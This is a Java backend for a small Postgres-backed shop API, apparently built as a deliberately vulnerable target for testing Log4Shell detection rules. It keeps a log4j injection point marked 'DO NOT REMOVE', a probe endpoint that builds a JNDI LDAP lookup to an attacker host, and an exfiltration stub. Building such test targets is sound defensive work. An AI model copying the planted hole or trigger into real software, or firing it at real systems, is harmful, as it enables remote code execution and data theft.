package io.fusioncore;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * fusioncore "shop" backend — a small but REAL product API backed by postgres.
 * Normal traffic exercises the DB on every call, so the chain's baseline includes
 * a steady backend→postgres edge (which is what the JNDI exfil hop blends into).
 *
 *   GET  /api/products            list catalog        (logs UA through log4j — vulnerable surface)
 *   GET  /api/products?q=&category=   filtered search (ILIKE + category)
 *   GET  /api/products/{id}       product detail
 *   POST /api/login               looks up user by email, returns a (fake) JWT
 *   POST /api/cart                price lookup + total for a set of SKUs
 *   POST /api/checkout            INSERT an order, returns order id
 *   GET  /api/orders              recent orders
 *   GET  /healthz                 liveness (no DB)
 *
 * Postgres connection comes from env (POSTGRES_HOST, POSTGRES_DB, POSTGRES_USER),
 * trust auth (empty password) — same as the deploy manifests.
 *
 * Where the malicious LDAP referral server lives — the endpoint the Log4Shell
 * JNDI lookup dials out to — is env-driven so the same image runs anywhere
 * (mirrors the attacker image's CODEBASE_HOST/CODEBASE_URL, see PR #144):
 *   LDAP_URL   full override, e.g. ldap://1.2.3.4:1389/Probe
 *   LDAP_HOST  just host[:port] (default: the in-cluster attacker Service)
 * A non-private/public LDAP_HOST is what makes the backend's call-out egress
 * non-private, so R0011 (unexpected egress) fires — the network side of the
 * chain. The /api/_probe endpoint fires this lookup on demand.
 */
public class App {
    private static final Logger log = LogManager.getLogger(App.class);

    private static final String PG_HOST = env("POSTGRES_HOST", "chain-postgres");
    private static final String PG_DB   = env("POSTGRES_DB", "appdb");
    private static final String PG_USER = env("POSTGRES_USER", "postgres");
    private static final String PG_URL  = "jdbc:postgresql://" + PG_HOST + ":5432/" + PG_DB;

    /** LDAP referral endpoint the JNDI lookup dials. LDAP_URL wins; else built from LDAP_HOST. */
    private static final String LDAP_URL = ldapUrl();

    static String env(String k, String d) { String v = System.getenv(k); return (v == null || v.isEmpty()) ? d : v; }

    static String ldapUrl() {
        String url = System.getenv("LDAP_URL");
        if (url != null && !url.isEmpty()) return url;
        return "ldap://" + env("LDAP_HOST", "attacker.attacker-ns.svc.cluster.local:1389") + "/Probe";
    }

    static Connection conn() throws SQLException { return DriverManager.getConnection(PG_URL, PG_USER, ""); }

    public static void main(String[] args) throws IOException {
        int port = Integer.parseInt(env("PORT", "8080"));
        HttpServer s = HttpServer.create(new InetSocketAddress(port), 0);
        s.createContext("/api/products", new ProductHandler());
        s.createContext("/api/login",    new LoginHandler());
        s.createContext("/api/cart",     new CartHandler());
        s.createContext("/api/checkout", new CheckoutHandler());
        s.createContext("/api/orders",   new OrdersHandler());
        s.createContext("/api/_probe",   new ProbeHandler());
        s.createContext("/healthz",      ex -> respond(ex, 200, "{\"status\":\"ok\"}"));
        s.setExecutor(Executors.newFixedThreadPool(8));
        s.start();
        log.info("chain-backend started on port {} (db={}, ldap={})", port, PG_URL, LDAP_URL);
    }

    // ─────────────────── /api/_probe (configurable Log4Shell self-probe) ───────────────────
    /**
     * Fires the JNDI trigger at the configured LDAP endpoint through the SAME
     * vulnerable log4j line as ProductHandler. Lets a caller trip one
     * deterministic, off-profile LDAP egress (a falsifiability probe) without a
     * separate attack pod — the destination is wherever LDAP_URL/LDAP_HOST points,
     * so it pairs with the attacker image's public CODEBASE_HOST (PR #144) to
     * exercise the network side (R0011). On a patched build the string is logged
     * literally and no lookup happens. Normal traffic never hits this path.
     */
    static class ProbeHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String trigger = "${jndi:" + LDAP_URL + "}";
            log.info("self-probe q={} ua={}", "probe", trigger);
            respond(ex, 200, "{\"probe\":\"" + esc(LDAP_URL) + "\"}");
        }
    }

    // ───────────────────────── helpers ─────────────────────────
    static void respond(HttpExchange ex, int code, String body) throws IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().add("Content-Type", "application/json");
        ex.sendResponseHeaders(code, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    static String param(String query, String key) {
        if (query == null) return null;
        for (String kv : query.split("&")) {
            int i = kv.indexOf('=');
            if (i > 0 && kv.substring(0, i).equals(key)) return urldecode(kv.substring(i + 1));
        }
        return null;
    }

    static String urldecode(String s) { try { return java.net.URLDecoder.decode(s, "UTF-8"); } catch (Exception e) { return s; } }

    static String esc(String s) { return s == null ? "" : s.replace("\\", "\\\\").replace("\"", "\\\""); }

    static String readBody(HttpExchange ex) throws IOException {
        return new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
    }

    /** demo-grade extractor for {"k":"v"} string fields. */
    static String jsonStr(String body, String key) {
        if (body == null) return null;
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"([^\"]*)\"").matcher(body);
        return m.find() ? m.group(1) : null;
    }

    static String productJson(ResultSet rs) throws SQLException {
        return "{\"id\":" + rs.getInt("id")
            + ",\"name\":\"" + esc(rs.getString("name")) + "\""
            + ",\"sku\":\"" + esc(rs.getString("sku")) + "\""
            + ",\"category\":\"" + esc(rs.getString("category")) + "\""
            + ",\"price_cents\":" + rs.getInt("price_cents")
            + ",\"stock\":" + rs.getInt("stock")
            + ",\"description\":\"" + esc(rs.getString("description")) + "\"}";
    }

    // ─────────────────── /api/products (list + search + detail) ───────────────────
    static class ProductHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String path  = ex.getRequestURI().getPath();
            String query = ex.getRequestURI().getQuery();
            String ua    = ex.getRequestHeaders().getFirst("User-Agent");
            String q     = param(query, "q");
            // The vulnerable line — log4j ≤ 2.14.1 interprets ${jndi:…} in the UA here. DO NOT REMOVE.
            log.info("product query q={} ua={}", q, ua);

            String idPart = path.length() > "/api/products".length()
                ? path.substring(Math.min(path.length(), "/api/products/".length())) : null;
            try (Connection c = conn()) {
                if (idPart != null && idPart.matches("\\d+")) {
                    try (PreparedStatement ps = c.prepareStatement(
                            "SELECT id,name,sku,category,price_cents,stock,description FROM products WHERE id=?")) {
                        ps.setInt(1, Integer.parseInt(idPart));
                        try (ResultSet rs = ps.executeQuery()) {
                            if (rs.next()) { respond(ex, 200, productJson(rs)); return; }
                            respond(ex, 404, "{\"error\":\"not found\"}"); return;
                        }
                    }
                }
                String category = param(query, "category");
                StringBuilder sql = new StringBuilder(
                    "SELECT id,name,sku,category,price_cents,stock,description FROM products WHERE 1=1");
                List<String> binds = new ArrayList<>();
                if (q != null && !q.isEmpty())               { sql.append(" AND name ILIKE ?"); binds.add("%" + q + "%"); }
                if (category != null && !category.isEmpty())  { sql.append(" AND category=?");   binds.add(category); }
                sql.append(" ORDER BY id LIMIT 50");
                try (PreparedStatement ps = c.prepareStatement(sql.toString())) {
                    for (int i = 0; i < binds.size(); i++) ps.setString(i + 1, binds.get(i));
                    try (ResultSet rs = ps.executeQuery()) {
                        StringBuilder out = new StringBuilder("{\"products\":[");
                        boolean first = true;
                        while (rs.next()) { if (!first) out.append(","); out.append(productJson(rs)); first = false; }
                        out.append("]}");
                        respond(ex, 200, out.toString());
                    }
                }
            } catch (SQLException e) {
                log.warn("products query failed: {}", e.getMessage());
                respond(ex, 503, "{\"error\":\"db unavailable\"}");
            }
        }
    }

    // ─────────────────── /api/login (look up user) ───────────────────
    static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String body = readBody(ex);
            String user = jsonStr(body, "user");
            if (user == null) user = jsonStr(body, "email");
            try (Connection c = conn();
                 PreparedStatement ps = c.prepareStatement("SELECT id,full_name FROM users WHERE email=?")) {
                ps.setString(1, user == null ? "" : user);
                try (ResultSet rs = ps.executeQuery()) {
                    if (rs.next())
                        respond(ex, 200, "{\"token\":\"fake.jwt." + rs.getInt("id")
                            + "\",\"name\":\"" + esc(rs.getString("full_name")) + "\"}");
                    else
                        respond(ex, 200, "{\"token\":\"fake.jwt.token\"}");
                }
            } catch (SQLException e) {
                // login is not the detection focus in any scenario — fail open.
                respond(ex, 200, "{\"token\":\"fake.jwt.token\"}");
            }
        }
    }

    // ─────────────────── /api/cart (price lookup + total) ───────────────────
    static class CartHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String skus = jsonStr(readBody(ex), "skus");
            if (skus == null || skus.isEmpty()) { respond(ex, 200, "{\"items\":[],\"total_cents\":0}"); return; }
            String[] arr = skus.split(",");
            try (Connection c = conn()) {
                StringBuilder in = new StringBuilder();
                for (int i = 0; i < arr.length; i++) in.append(i == 0 ? "?" : ",?");
                try (PreparedStatement ps = c.prepareStatement(
                        "SELECT sku,name,price_cents FROM products WHERE sku IN (" + in + ")")) {
                    for (int i = 0; i < arr.length; i++) ps.setString(i + 1, arr[i].trim());
                    try (ResultSet rs = ps.executeQuery()) {
                        StringBuilder out = new StringBuilder("{\"items\":[");
                        int total = 0; boolean first = true;
                        while (rs.next()) {
                            if (!first) out.append(","); first = false;
                            int pc = rs.getInt("price_cents"); total += pc;
                            out.append("{\"sku\":\"" + esc(rs.getString("sku")) + "\",\"name\":\""
                                + esc(rs.getString("name")) + "\",\"price_cents\":" + pc + "}");
                        }
                        out.append("],\"total_cents\":" + total + "}");
                        respond(ex, 200, out.toString());
                    }
                }
            } catch (SQLException e) { respond(ex, 503, "{\"error\":\"db unavailable\"}"); }
        }
    }

    // ─────────────────── /api/checkout (INSERT order) ───────────────────
    static class CheckoutHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String body = readBody(ex);
            String userEmail = jsonStr(body, "user"); if (userEmail == null) userEmail = "guest@example.com";
            String skus = jsonStr(body, "skus");      if (skus == null) skus = "";
            try (Connection c = conn()) {
                int total = 0;
                if (!skus.isEmpty()) {
                    String[] arr = skus.split(",");
                    StringBuilder in = new StringBuilder();
                    for (int i = 0; i < arr.length; i++) in.append(i == 0 ? "?" : ",?");
                    try (PreparedStatement ps = c.prepareStatement(
                            "SELECT COALESCE(SUM(price_cents),0) FROM products WHERE sku IN (" + in + ")")) {
                        for (int i = 0; i < arr.length; i++) ps.setString(i + 1, arr[i].trim());
                        try (ResultSet rs = ps.executeQuery()) { if (rs.next()) total = rs.getInt(1); }
                    }
                }
                int orderId;
                try (PreparedStatement ps = c.prepareStatement(
                        "INSERT INTO orders(user_email,total_cents,items) VALUES (?,?,?) RETURNING id")) {
                    ps.setString(1, userEmail); ps.setInt(2, total); ps.setString(3, skus);
                    try (ResultSet rs = ps.executeQuery()) { rs.next(); orderId = rs.getInt(1); }
                }
                respond(ex, 200, "{\"order_id\":" + orderId + ",\"total_cents\":" + total + "}");
            } catch (SQLException e) { respond(ex, 503, "{\"error\":\"db unavailable\"}"); }
        }
    }

    // ─────────────────── /api/orders (recent) ───────────────────
    static class OrdersHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            try (Connection c = conn();
                 PreparedStatement ps = c.prepareStatement(
                     "SELECT id,user_email,total_cents FROM orders ORDER BY id DESC LIMIT 20");
                 ResultSet rs = ps.executeQuery()) {
                StringBuilder out = new StringBuilder("{\"orders\":[");
                boolean first = true;
                while (rs.next()) {
                    if (!first) out.append(","); first = false;
                    out.append("{\"id\":" + rs.getInt("id") + ",\"user_email\":\""
                        + esc(rs.getString("user_email")) + "\",\"total_cents\":" + rs.getInt("total_cents") + "}");
                }
                out.append("]}");
                respond(ex, 200, out.toString());
            } catch (SQLException e) { respond(ex, 503, "{\"error\":\"db unavailable\"}"); }
        }
    }

    /**
     * Preserved for the JNDI Payload contract (scenarios A/B). The shipped Payload runs
     * psql via /bin/sh directly; this documents the exfil intent and keeps the symbol.
     */
    public static String queryPostgresAndExfil(String host, String db, String user) {
        try (Connection c = DriverManager.getConnection("jdbc:postgresql://" + host + ":5432/" + db, user, "")) {
            try (Statement st = c.createStatement();
                 ResultSet rs = st.executeQuery("SELECT current_database()||':'||current_user||':'||substring(version(),1,40)")) {
                if (rs.next()) return rs.getString(1);
            }
        } catch (SQLException e) { return "PG_ERR:" + e.getMessage(); }
        return "";
    }
}
